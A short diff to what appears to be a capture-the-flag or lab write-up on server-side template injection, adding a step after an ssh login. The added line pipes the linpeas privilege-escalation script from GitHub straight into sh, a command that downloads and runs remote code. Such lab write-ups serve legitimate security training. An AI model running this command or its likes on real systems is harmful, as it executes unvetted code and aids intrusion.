@@ -31,3 +31,7 @@ https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
 ssh kevin@62.173.140.174 -p 18122
 ```
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/4ddada70-30b9-4639-8774-0c0f0c469ed1)
+```
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/c2305b25-6448-4fb9-a9cb-2b1184d1afa0)
